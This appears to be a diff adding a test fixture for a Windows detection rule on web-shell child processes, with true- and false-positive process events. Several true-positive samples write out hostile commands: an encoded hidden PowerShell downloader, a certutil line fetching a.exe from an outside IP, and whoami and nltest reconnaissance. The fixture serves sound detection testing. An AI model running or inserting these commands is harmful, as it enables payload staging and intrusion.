@@ -1,0 +1,64 @@
+rule: rules/windows/process_creation/proc_creation_win_webshell_child_process.yml
+true_positive:
+    - name: IIS worker spawns cmd.exe running whoami
+      event:
+          _logsource: {product: windows, category: process_creation}
+          EventID: 1
+          ParentImage: 'C:\Windows\System32\inetsrv\w3wp.exe'
+          Image: 'C:\Windows\System32\cmd.exe'
+          OriginalFileName: 'Cmd.Exe'
+          CommandLine: 'cmd.exe /c whoami /all'
+          User: 'IIS APPPOOL\DefaultAppPool'
+    - name: Tomcat worker launches PowerShell downloader
+      event:
+          _logsource: {product: windows, category: process_creation}
+          EventID: 1
+          ParentImage: 'C:\Program Files\Apache\Tomcat9\bin\tomcat9.exe'
+          Image: 'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe'
+          OriginalFileName: 'PowerShell.EXE'
+          CommandLine: 'powershell -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoA'
+          User: 'NT AUTHORITY\NETWORK SERVICE'
+    - name: PHP-CGI worker runs certutil to stage a payload
+      event:
+          _logsource: {product: windows, category: process_creation}
+          EventID: 1
+          ParentImage: 'C:\Program Files\PHP\php-cgi.exe'
+          Image: 'C:\Windows\System32\certutil.exe'
+          OriginalFileName: 'certutil.exe'
+          CommandLine: 'certutil -urlcache -split -f http://198.51.100.20/a.txt a.exe'
+          User: 'IIS APPPOOL\web'
+    - name: IIS worker enumerates domain trusts with nltest
+      event:
+          _logsource: {product: windows, category: process_creation}
+          EventID: 1
+          ParentImage: 'C:\Windows\System32\inetsrv\w3wp.exe'
+          Image: 'C:\Windows\System32\nltest.exe'
+          CommandLine: 'nltest /domain_trusts /all_trusts'
+          User: 'IIS APPPOOL\DefaultAppPool'
+false_positive:
+    - name: ASP.NET first-request compilation through cmd.exe
+      event:
+          _logsource: {product: windows, category: process_creation}
+          EventID: 1
+          ParentImage: 'C:\Windows\System32\inetsrv\w3wp.exe'
+          Image: 'C:\Windows\System32\cmd.exe'
+          OriginalFileName: 'Cmd.Exe'
+          CommandLine: 'cmd.exe /q /c csc.exe /noconfig /fullpaths @"C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Temporary ASP.NET Files\root\a1\b2\x.cmdline"'
+          User: 'IIS APPPOOL\DefaultAppPool'
+    - name: Normal user opens a shell from Explorer
+      event:
+          _logsource: {product: windows, category: process_creation}
+          EventID: 1
+          ParentImage: 'C:\Windows\explorer.exe'
+          Image: 'C:\Windows\System32\cmd.exe'
+          OriginalFileName: 'Cmd.Exe'
+          CommandLine: 'cmd.exe'
+          User: 'CONTOSO\jdoe'
+    - name: IIS worker spawns its own child worker
+      event:
+          _logsource: {product: windows, category: process_creation}
+          EventID: 1
+          ParentImage: 'C:\Windows\System32\inetsrv\w3wp.exe'
+          Image: 'C:\Windows\System32\inetsrv\w3wp.exe'
+          CommandLine: 'w3wp.exe -ap "DefaultAppPool"'
+          User: 'IIS APPPOOL\DefaultAppPool'
